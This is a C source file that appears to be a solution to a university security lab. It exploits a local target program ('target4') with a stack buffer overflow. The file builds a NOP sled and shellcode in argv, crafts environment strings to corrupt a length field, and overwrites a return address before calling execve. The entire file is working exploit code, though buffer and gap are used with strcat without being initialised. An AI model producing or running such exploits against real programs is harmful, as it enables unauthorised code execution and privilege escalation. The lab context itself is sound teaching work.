#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
  char *args[3];
  char *env[10];

  // memory address between buff and len
  char buffer[400];
  char *nop = "\x90";

  for (int i = 0; i < 117; i++)
    strcat(buffer, nop);
  strcat(buffer, shellcode);

  strcat(buffer, "\0");

  char *newLen = "\x14"; //20 in decimal
  char return_addr[] = "\xf6\xfd\x21\x30"; // addr where NOPs in buffer starts

  char gap[500];
  for (int i = 0; i < 2; i++)
    strcat(gap, nop);
  strcat(gap, return_addr);

  // arguments and envs
  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;

  env[0] = "\0"; //sets i=0
  env[1] = "\0";
  env[2] = "\0";
  env[3] = newLen;
  env[4] = "\0\0";
  env[5] = "\0\0";
  env[6] = gap; // 20 characters starting from env[0]
  env[7] = "\0";
  env[8] = "\0";
  env[9] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
